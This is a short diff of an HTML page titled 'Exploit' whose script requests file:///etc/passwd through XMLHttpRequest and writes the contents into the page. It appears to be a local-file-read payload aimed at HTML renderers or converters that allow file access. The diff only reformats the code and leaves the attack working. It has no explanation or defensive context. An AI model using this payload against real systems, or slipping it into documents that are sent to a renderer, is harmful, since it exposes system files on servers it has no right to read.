@@ -1,15 +1,19 @@
 <!DOCTYPE html>
-<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Exploit</title>
+</head>
 <body>
 
 <script>
-x=new XMLHttpRequest;
-x.onload=function(){
-document.write(this.responseText)
+var x = new XMLHttpRequest();
+x.onload = function() {
+    document.write("<pre>" + this.responseText + "</pre>");
 };
-x.open("GET","file:///etc/passwd");
+x.open("GET", "file:///etc/passwd", true);
 x.send();
 </script>
 
-</body></html>
+</body>
+</html>
